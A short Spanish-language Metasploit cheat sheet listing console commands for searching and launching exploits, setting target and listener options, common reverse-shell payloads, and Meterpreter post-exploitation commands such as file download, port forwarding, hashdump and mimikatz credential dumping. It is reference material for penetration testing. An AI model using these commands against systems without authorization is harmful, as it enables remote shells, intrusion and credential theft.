# METASPLOIT CHEATSHEET

## 1. Comandos Básicos

```bash
# Iniciar
msfconsole
msfconsole -q  # Modo silencioso

# Ayuda
help
help <comando>
show -h
```

## 2. Búsqueda

```bash
# Buscar exploits
search <termino>
search type:exploit platform:windows
search name:ssh cve:2024

# Usar exploit
use exploit/<ruta>
use auxiliary/<ruta>
use post/<ruta>
```

## 3. Configuración

```bash
# Ver opciones
show options
show advanced

# Configurar
set RHOSTS <IP>
set RPORT <PUERTO>
set PAYLOAD <payload>
set LHOST <IP>
set LPORT <PUERTO>

# Ejecutar
check    # Verificar
exploit  # Ejecutar
run      # Ejecutar (auxiliary)
```

## 4. Payloads

```bash
# Listar payloads
show payloads

# Payloads comunes
windows/x64/meterpreter_reverse_tcp
windows/meterpreter_reverse_tcp
linux/x64/shell_reverse_tcp
python/shell_reverse_tcp
```

## 5. Meterpreter

```bash
# Ayuda
help

# Sistema
sysinfo
getuid
getpid
ps

# Shell
shell
exit

# Archivos
ls
cd
pwd
cat <archivo>
download <archivo>
upload <archivo>

# Red
ipconfig
ifconfig
route
portfwd

# Credenciales
hashdump
mimikatz
```
